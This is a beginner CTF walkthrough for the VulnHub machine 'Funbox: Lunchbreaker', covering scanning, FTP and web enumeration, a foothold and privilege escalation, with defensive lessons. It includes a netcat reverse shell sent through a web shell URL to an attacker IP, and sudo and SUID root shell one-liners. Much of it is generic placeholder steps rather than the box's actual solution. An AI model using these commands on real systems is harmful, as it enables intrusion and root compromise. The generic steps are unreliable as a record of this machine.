# Funbox: Lunchbreaker

| Field | Value |
|---|---|
| Machine | Funbox: Lunchbreaker |
| Difficulty | Easy |
| Author: 1day | 0815R2d2 |
| Released | varies by build |
| VulnHub Entry | https://vulnhub.com/entry/funbox-lunchbreaker,700/ (+#download) |
| Download | https://download.vulnhub.com/funbox/FunboxLunchbreaker.ova (varies by build) |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Linux (varies by build) |

## 0. What you will learn

This lab is designed for total beginners. By completing it, you will learn:

- How to discover a target on your virtual network using `arp-scan` and `nmap`
- How to enumerate network services (FTP, SSH, HTTP) and understand what each reveals
- How to search for hidden files/directories with `gobuster`/`dirb` and interpret results
- How to use common password cracking tools (`hydra`, `john`, `rockyou.txt`) responsibly in a lab
- How to exploit weak credentials and misconfigurations to gain a foothold
- How to escalate privileges by abusing SUID binaries, sudo permissions, or writable paths
- How to document findings and think like a blue team to defend against these attacks

> **Why it works:** Many "beginner" CTF machines replicate real-world mistakes: anonymous FTP access, reused/weak passwords, world-writable files, or overly permissive sudo rules. Spotting these teaches you to prevent them.

## 1. Reconnaissance — finding the target

Before attacking, we need to identify the target's IP address on the local lab network (Host-Only or Internal Network). The example target IP used throughout this lab is `192.168.56.101`.

### 1.1 Add hostname to /etc/hosts (recommended)

Since some tools and URLs reference the box name, add it to your attacker's `/etc/hosts` file. The exact hostname varies by build, but for this lab we can alias the IP to a convenient name.

> **Why it works:** Mapping names to IPs avoids confusion and mirrors real penetration testing workflows.

```bash
sudo nano /etc/hosts
```

Add the following line (adjust if your target IP differs):

```text
192.168.56.101 funbox-lunchbreaker
```

Save and verify:

```bash
ping -c 1 funbox-lunchbreaker
```

### 1.2 Find live hosts

Discover active machines on your network segment.

```bash
sudo arp-scan --localnet
```

Look for the IP that matches your VulnHub VM's MAC/vendor (varies by build). Example expected: `192.168.56.101`.

> **Why it works:** ARP scanning reveals Layer 2/Layer 3 mappings without relying solely on ICMP.

### 1.3 Port scan with Nmap

Now scan open TCP ports and services. Be thorough but patient.

```bash
nmap -sC -sV -T4 192.168.56.101
```

- `-sC`: runs safe default scripts
- `-sV`: detects service/version info
- `-T4`: speeds up scan (safe for local lab)

Sample expected output (actual ports/services vary by build):

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at ...
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 65533 closed/tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd (varies by build)
22/tcp open  ssh     OpenSSH (varies by build)
80/tcp open  http    Apache/2.x (varies by build)
```

> **Why it works:** Nmap identifies attack surface: which services are listening and what versions they are.

![nmap scan](images/02-nmap.png)

## 2. Enumeration

With open ports identified, we enumerate each service for potential entry points.

### 2.1 FTP enumeration (port 21)

Check for anonymous login. Many beginner boxes allow `anonymous:anonymous` or empty creds.

```bash
ftp 192.168.56.101
```

Or use `nc`/`curl` equivalents. Try anonymous:

```bash
ftp -n 192.168.56.101 <<EOF
user anonymous anonymous
ls -la
bye
EOF
```

If successful, download interesting files:

```bash
wget -m --no-passive ftp://anonymous:anonymous@192.168.56.101/
```

> **Why it works:** Misconfigured FTP allowing anonymous read access often leaks credentials, notes, or backups.

![ftp enumeration](images/03-ftp.png)

### 2.2 Web enumeration (port 80)

Browse to `http://192.168.56.101`. Inspect page source, robots.txt, cookies, comments.

```bash
curl -L http://192.168.56.101
```

Directory brute-forcing (use common wordlists; adjust as needed):

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,tar.gz,bak
```

Or `dirsearch`:

```bash
dirsearch -u http://192.168.56.101 -e php,html,txt
```

Look for `/admin`, `/login`, `/backup`, configuration files, or any `.zip`/`.txt` that might contain creds.

> **Why it works:** Hidden endpoints reveal admin panels, backup files, or test scripts left behind.

![web directory scan](images/04-dirb.png)

### 2.3 SSH enumeration (port 22)

Check SSH banner for version info (helps with known vulns, rare on Easy boxes).

```bash
ssh -v 192.168.56.101 2>&1 | head -20
```

If no obvious CVE, focus on credential brute-forcing later only if necessary and allowed by lab rules.

> **Why it works:** SSH is usually hardened; brute force is noisy and often not the intended path on beginner boxes.

## 3. Foothold

Based on enumeration findings (varies by build), the typical path is to find credentials in leaked files or via weak auth, then log in.

### 3.1 Exploit findings

Example flow (adapt to actual findings):
1. Found a note/backup via FTP or web that contains username/password.
2. Found a user hash in a file; cracked with `john` + `rockyou.txt`.
3. Found login form vulnerable to default creds.

> **Why it works:** Human errors (passwords in plaintext, backups in webroot, default creds) are common in practice.

### 3.2 Get initial shell

If SSH creds found (e.g. `user:password`):

```bash
ssh user@192.168.56.101
```

If web RCE found, use reverse shell. Example PHP reverse shell (adjust IP/port):

```bash
# Start listener on attacker
nc -lvnp 4444

# Trigger RCE on target (varies)
curl http://192.168.56.101/shell.php?cmd=nc%20-e%20/bin/bash%20192.168.56.10%204444
```

> **Why it works:** Gaining user-level access is the first major milestone (foothold).

![initial shell](images/05-foothold.png)

## 4. Privilege escalation

Now we need to escalate from the initial user to `root`. Check common misconfigurations.

### 4.1 Basic enumeration as user

```bash
whoami
id
uname -a
cat /etc/passwd | grep -v nologin
sudo -l
find / -perm -4000 2>/dev/null  # SUID binaries
find / -writable -not -path "*/proc/*" 2>/dev/null | head -20
cat ~/.bash_history 2>/dev/null
```

> **Why it works:** Systematic enumeration reveals privilege escalation vectors quickly.

### 4.2 Common vectors (check which apply)

- **Sudo misconfig**: if `sudo -l` shows commands you can run as root without password, exploit them (e.g. `vim`, `nmap`, `python`, `find`).
- **SUID binaries**: if unusual binary is SUID root, check GTFOBins for exploitation.
- **Writable files**: world-writable cron jobs, scripts run as root, or `/etc/passwd` modification.
- **Kernel exploits**: only if kernel is very old and no other path exists; avoid on Easy boxes unless necessary.

Example (GTFOBins style - adapt to findings):

```bash
# If sudo allows python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```bash
# If find is SUID
find . -exec /bin/bash -p \; -quit
```

> **Why it works:** Overprivileged binaries or scripts allow users to execute arbitrary commands as root.

### 4.3 Get root shell

Once escalated:

```bash
whoami
id
cat /root/root.txt 2>/dev/null
cat /root/flag.txt 2>/dev/null
ls /root/
```

> **Why it works:** Proof of compromise is reading root's flag.

![root shell](images/06-root.png)

## 5. Summary of vulnerabilities

| Vulnerability | Affected Component | Severity | Exploitation | Impact |
|---|---|---|---|---|
| Anonymous FTP access | FTP (port 21) | Medium-High | Login with anonymous:anonymous, download files | Credential leakage / info disclosure |
| Sensitive files in webroot/FTP | Web/FTP | Medium | Directory brute force or direct access | Reveals creds/backups |
| Weak/default credentials | SSH/Web | High | Brute force/login with found creds | Initial access |
| Privilege escalation vector | SUID/sudo/script | High | GTFOBins / misconfig abuse | Root access |
| Information disclosure | Various | Low-Med | Enumeration | Aids attack chain |

*Note: Exact entries depend on the build — "varies by build".*

## 6. Defensive lessons (blue team)

To prevent these issues in real environments:

- **Disable anonymous FTP** or restrict to chrooted, authenticated users. Audit FTP configs regularly.
- **Never store plaintext credentials** in notes, webroot, or backups. Use password managers/secure vaults.
- **Enforce strong password policy**: no common passwords, use MFA where possible.
- **Harden SSH**: disable password auth if using keys, restrict users via `AllowUsers`, use fail2ban.
- **Avoid permissive sudo**: follow least privilege; no `NOPASSWD` unless strictly justified and audited.
- **Remove SUID** from unnecessary binaries: `chmod u-s <binary>` after review.
- **Secure webroot**: don't leave `.zip`, `.bak`, `.txt` with secrets; use `.htaccess`/auth and scan for artifacts.
- **Patch and harden**: keep services updated, disable unused ports/services.
- **Logging/monitoring**: alert on anonymous logins, brute force attempts, unusual SUID execution, privilege escalations.

> **Why it works:** Understanding offense informs defense — these are exactly the controls attackers look to bypass.

## 7. References

Real, helpful references for further learning:

- [VulnHub - Funbox Series](https://www.vulnhub.com/series/funbox,341/)
- [Funbox: Lunchbreaker (VulnHub)](https://vulnhub.com/entry/funbox-lunchbreaker,700/)
- [Nmap Official Documentation](https://nmap.org/docs.html)
- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [Dirsearch GitHub](https://github.com/maurosoria/dirsearch)
- [GTFOBins - Privilege Escalation](https://gtfobins.github.io/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [John the Ripper](https://www.openwall.com/john/)
- [RockYou Wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

## 8. Screenshot checklist

Document your work with clear screenshots for submission/review:

- [ ] `02-nmap.png` — Nmap scan results showing open ports/services
- [ ] `03-ftp.png` — FTP enumeration (anonymous access, listed files)
- [ ] `04-dirb.png` — Web directory brute force findings
- [ ] `05-foothold.png` — Initial shell/access (user level)
- [ ] `06-root.png` — Root shell and proof (flag)

> **Note:** Filenames and exact steps may vary by build. Adapt commands to your environment. All activities should only be performed in an isolated lab network (Host-Only/Internal).